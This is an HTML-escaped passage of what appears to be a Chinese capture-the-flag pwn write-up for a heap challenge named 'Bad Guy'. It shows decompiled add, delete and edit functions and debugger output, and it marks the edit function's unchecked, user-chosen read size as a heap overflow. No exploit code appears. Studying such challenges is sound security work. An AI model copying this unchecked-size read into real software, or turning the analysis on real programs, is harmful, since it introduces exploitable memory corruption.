class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; __cdecl __noreturn &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **argv, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **envp)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; num; &lt;span class=&#34;comment&#34;&gt;// eax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  prog_init(argc, argv, envp);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;=== Bad Guy ===&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;1. Malloc&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;2. Edit&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;3. Free&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt;&amp;gt; &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      num = read_num();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( num != &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      edit();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( num &amp;gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( num == &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        delete();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( num == &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LABEL_13:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;2333, Bad Guy!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( num != &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_13;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      add();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;结构体&#34;&gt;&lt;a href=&#34;#结构体&#34; class=&#34;headerlink&#34; title=&#34;结构体&#34;&gt;&lt;/a&gt;结构体&lt;/h3&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *content;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; heaparray;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;add&#34;&gt;&lt;a href=&#34;#add&#34; class=&#34;headerlink&#34; title=&#34;add&#34;&gt;&lt;/a&gt;add&lt;/h3&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;ssize_t&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 num; &lt;span class=&#34;comment&#34;&gt;// [rsp+0h] [rbp-10h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 size; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index :&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  num = read_num();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;size: &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  size = read_num();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  *((_QWORD *)&amp;amp;heaparray + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * num + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !*((_QWORD *)&amp;amp;heaparray + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * num + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) || num &amp;gt; &lt;span class=&#34;number&#34;&gt;0xA&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Bad Guy!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  *((_QWORD *)&amp;amp;heaparray + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * num) = size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Content:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, *((&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; **)&amp;amp;heaparray + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * num + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;), size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;heaparray是存放分配堆块的指针的&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; tele &lt;span class=&#34;number&#34;&gt;0x555555602040&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0000&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x555555602040&lt;/span&gt; (heaparray) ◂— &lt;span class=&#34;number&#34;&gt;0x14&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;01&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0008&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x555555602048&lt;/span&gt; (heaparray+&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) —▸ &lt;span class=&#34;number&#34;&gt;0x555555400ced&lt;/span&gt; (add+&lt;span class=&#34;number&#34;&gt;92&lt;/span&gt;) ◂— mov rdx, qword ptr [rbp - &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;02&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0010&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x555555602050&lt;/span&gt; (heaparray+&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h3 id=&#34;delete&#34;&gt;&lt;a href=&#34;#delete&#34; class=&#34;headerlink&#34; title=&#34;delete&#34;&gt;&lt;/a&gt;delete&lt;/h3&gt;&lt;p&gt;free过后 也置0了&lt;/p&gt;
&lt;p&gt;如果不置0,那free是干了什么..我记得是..&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;delete&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _QWORD *v0; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 num; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index :&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  num = read_num();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( *((_QWORD *)&amp;amp;heaparray + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * num + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) || num &amp;gt; &lt;span class=&#34;number&#34;&gt;0xA&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(*((&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; **)&amp;amp;heaparray + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * num + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v0 = (_QWORD *)((&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)&amp;amp;heaparray + &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt; * num + &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    *v0 = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    LODWORD(v0) = &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Bad Guy!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)v0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h3 id=&#34;edit&#34;&gt;&lt;a href=&#34;#edit&#34; class=&#34;headerlink&#34; title=&#34;edit&#34;&gt;&lt;/a&gt;edit&lt;/h3&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;edit&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 num; &lt;span class=&#34;comment&#34;&gt;// [rsp+0h] [rbp-10h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 nbytes; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( count &amp;lt;= &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Bad Guy!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  --count;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index :&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  num = read_num();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;size: &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  nbytes = read_num();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !*((_QWORD *)&amp;amp;heaparray + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * num + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) || num &amp;gt; &lt;span class=&#34;number&#34;&gt;9&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Bad Guy!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;content: &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, *((&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; **)&amp;amp;heaparray + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * num + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;), nbytes);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;&lt;font color=&#34;red&#34;&gt;这里是漏洞点,可以读入任意的大小&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;alarm 把值给改了&lt;/p&gt;
